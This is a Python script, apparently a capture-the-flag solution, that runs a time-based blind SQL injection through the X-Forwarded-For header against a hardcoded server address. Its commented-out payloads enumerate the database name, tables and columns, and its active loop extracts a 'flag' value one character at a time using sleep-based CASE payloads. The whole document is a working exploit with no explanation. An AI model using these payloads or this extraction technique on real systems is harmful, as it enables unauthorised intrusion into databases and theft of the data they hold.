import requests

url = "http://123.206.87.240:8002/web15/"
meta_word = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ,_{@#$%&*}"


def cala_length():
    for index in  range(0,59):
        try:
            # database() 5
            # playload="1' and case when(length(database())={0})then(sleep(5))else(select 1)end and '1".format(index)
            # group_concat(table_name) 14
            # playload = "1' and case when( (select length( (select group_concat(table_name)from information_schema.tables where table_schema='web15') ) )={0})then(sleep(5))else(select 1)end and '1".format(index)
            # flag(table).column ==> 4
            # playload = "1' and case when( (select length( (select group_concat(column_name)from information_schema.columns where table_name='flag')))={0} )then(sleep(5))else(select 1)end and '1".format(index)
            # flag length 32
            playload = "1' and case when((select length((select flag from flag)))={0})then(sleep(10))else(select 1)end  and '1".format(index)
            print(playload)
            requests.get(url, headers={'X-Forwarded-For': playload}, timeout=8)
        except Exception:
            print(index)
            break


def cala_name():
    last_result = ""
    for index in range(1,33):
        for i in meta_word:
            try:
                # database() = web15
                # playload="1' and(select case when( (select substring(database()from {0} for 1))='{1}' )then(sleep(5))else(select 1)end )and '1".format(index, i)
                # table_name = client_ip,flag
                # column flag ==> flag
                # playload = "1' and case when( (select substring( (select group_concat(column_name)from information_schema.columns where table_name='flag')from {0} for 1))='{1}' )then(sleep(5))else(select 1)end and '1".format(index, i)
                playload = "1' and case when((select substring((select flag from flag) from {0} for 1))='{1}')then(sleep(5))else(select 1)end  and '1".format(index, i)
                # print(playload)
                requests.get(url, headers={'X-Forwarded-For': playload}, timeout=3)
            except Exception:
                # print(i)
                last_result +=i
                break
        print("position: {0}".format(index))
    print(last_result)


if __name__ == "__main__":
    # cala_length()
    cala_name()
         



   